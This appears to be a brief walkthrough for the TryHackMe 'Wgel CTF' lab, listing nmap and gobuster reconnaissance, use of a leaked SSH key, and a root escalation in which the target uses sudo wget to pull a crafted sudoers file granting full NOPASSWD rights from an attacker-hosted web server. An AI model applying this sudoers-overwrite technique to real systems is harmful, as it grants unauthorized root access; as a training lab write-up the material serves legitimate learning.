---
title: Walkthrough - Wgel CTF	
published: true
---

Exfiltrate the root flag

[https://tryhackme.com/room/wgelctf](https://tryhackme.com/room/wgelctf)

* * *

## Discovery

- nmap -F -A -T4 10.10.247.33 -vvv
- gobuster dir -u http://10.10.247.33/sitemap -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,cgi --no-error -t 100 
- we find a username to use with the id_rsa in the source code of the apache welcome page

* * *

## User flag

- ``cat user_flag.txt``

* * * 

## Root flag

create sudoers file on attacker

```shell
#jessie  ALL=(root) NOPASSWD: /usr/bin/wget
jessie  ALL=(ALL) NOPASSWD: ALL
```

- ``python3 -m http.server 80``

- on target machine travel to /etc and wget sudoers file
- ``sudo su``
- ``cat /root/root_flag.txt``

* * * 